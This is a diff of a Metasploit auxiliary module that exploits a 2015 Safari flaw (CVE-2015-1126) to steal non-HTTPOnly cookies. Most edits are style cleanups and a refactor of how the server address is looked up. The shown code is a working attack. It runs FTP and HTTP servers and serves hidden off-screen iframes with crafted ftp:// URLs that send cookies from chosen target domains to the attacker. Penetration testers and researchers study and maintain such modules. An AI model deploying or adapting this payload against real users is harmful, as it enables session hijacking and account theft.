@@ -3,38 +3,45 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::FtpServer
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'        => 'Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft',
-      'Description' => %q{
-        A vulnerability exists in versions of OSX, iOS, and Windows Safari released
-        before April 8, 2015 that allows the non-HTTPOnly cookies of any
-        domain to be stolen.
-      },
-      'License'     => MSF_LICENSE,
-      'Author'      => [
-        'Jouko Pynnonen', # Initial discovery and disclosure
-        'joev',           # msf module
-      ],
-      'References'  => [
-        [ 'CVE', '2015-1126' ],
-        [ 'URL', 'https://seclists.org/fulldisclosure/2015/Apr/30' ]
-      ],
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer',
-      'DisclosureDate' => '2015-04-08'
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft',
+        'Description' => %q{
+          A vulnerability exists in versions of OSX, iOS, and Windows Safari released
+          before April 8, 2015 that allows the non-HTTPOnly cookies of any
+          domain to be stolen.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Jouko Pynnonen', # Initial discovery and disclosure
+          'joev',           # msf module
+        ],
+        'References' => [
+          [ 'CVE', '2015-1126' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Apr/30' ]
+        ],
+        'Actions' => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'DefaultAction' => 'WebServer',
+        'DisclosureDate' => '2015-04-08',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new('URIPATH', [false, 'The URI to use for this exploit (default is random)']),
-      OptPort.new('SRVPORT',   [true, 'The local port to use for the FTP server', 5555 ]),
-      OptPort.new('HTTPPORT',  [true, 'The HTTP server port', 8080]),
+      OptPort.new('SRVPORT', [true, 'The local port to use for the FTP server', 5555 ]),
+      OptPort.new('HTTPPORT', [true, 'The HTTP server port', 8080]),
       OptString.new('TARGET_DOMAINS', [
         true,
         'The comma-separated list of domains to steal non-HTTPOnly cookies from.',
@@ -43,38 +50,31 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-
   #
   # Start the FTP and HTTP server
   #
   def run
     start_service
-    print_status("Local FTP: #{lookup_lhost}:#{datastore['SRVPORT']}")
+    print_status("Local FTP: #{Rex::Socket.to_authority(srvhost_addr, srvport)}")
     start_http
     @http_service.wait
   end
-
 
   #
   # Handle the HTTP request and return a response.  Code borrowed from:
   # msf/core/exploit/http/server.rb
   #
-  def start_http(opts={})
+  def start_http(opts = {})
     # Ensture all dependencies are present before initializing HTTP
     use_zlib
 
-    comm = datastore['ListenerComm']
-    if comm.to_s == 'local'
-      comm = ::Rex::Socket::Comm::Local
-    else
-      comm = nil
-    end
+    comm = _determine_server_comm(bindhost)
 
     # Default the server host / port
     opts = {
-      'ServerHost' => datastore['SRVHOST'],
-      'ServerPort' => datastore['HTTPPORT'],
-      'Comm'       => comm
+      'ServerHost' => bindhost,
+      'ServerPort' => datastore['HTTPPORT'], # can't use bindport because this wants HTTPPORT not SRVPORT
+      'Comm' => comm
     }.update(opts)
 
     # Start a new HTTP server
@@ -84,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
       opts['ServerHost'],
       datastore['SSL'],
       {
-        'Msf'        => framework,
+        'Msf' => framework,
         'MsfExploit' => self,
       },
       opts['Comm'],
@@ -97,8 +97,8 @@ class MetasploitModule < Msf::Auxiliary
     # provided.
     uopts = {
       'Proc' => Proc.new { |cli, req|
-          on_request_uri(cli, req)
-        },
+        on_request_uri(cli, req)
+      },
       'Path' => resource_uri
     }.update(opts['Uri'] || {})
 
@@ -106,24 +106,12 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
 
     if opts['ServerHost'] == '0.0.0.0'
-      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
+      print_status("Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
     end
 
     # Add path to resource
     @service_path = uopts['Path']
     @http_service.add_resource(uopts['Path'], uopts)
-  end
-
-  #
-  # Lookup the right address for the client
-  #
-  def lookup_lhost(c=nil)
-    # Get the source address
-    if datastore['SRVHOST'] == '0.0.0.0'
-      Rex::Socket.source_address( c || '50.50.50.50')
-    else
-      datastore['SRVHOST']
-    end
   end
 
   #
@@ -162,7 +150,6 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   #
   # Ensures that gzip can be used.  If not, an exception is generated.  The
   # exception is only raised if the DisableGzip advanced option has not been
@@ -174,18 +161,16 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   #
   # Returns the configured (or random, if not configured) URI path
   #
   def resource_uri
     return @uri_path if @uri_path
 
-    @uri_path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8+rand(8))
+    @uri_path = datastore['URIPATH'] || Rex::Text.rand_text_alphanumeric(8 + rand(8))
     @uri_path = '/' + @uri_path if @uri_path !~ /^\//
     @uri_path
   end
-
 
   #
   # Handle HTTP requests and responses
@@ -209,7 +194,7 @@ class MetasploitModule < Msf::Auxiliary
       domains = datastore['TARGET_DOMAINS'].split(',')
       iframes = domains.map do |domain|
         %Q|<iframe style='position:fixed;top:-99999px;left:-99999px;height:0;width:0;'
-                src='ftp://user%40#{lookup_lhost}%3A#{datastore['SRVPORT']}%2Findex.html%23@#{domain}/'>
+                src='ftp://user%40#{srvhost_addr}%3A#{srvport}%2Findex.html%23@#{domain}/'>
         </iframe>|
       end
 
@@ -228,7 +213,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Create an HTTP response and then send it
   #
-  def send_response(cli, code, message='OK', html='')
+  def send_response(cli, code, message = 'OK', html = '')
     proto = Rex::Proto::Http::DefaultProtocol
     res = Rex::Proto::Http::Response.new(code, message, proto)
     res['Content-Type'] = 'text/html'
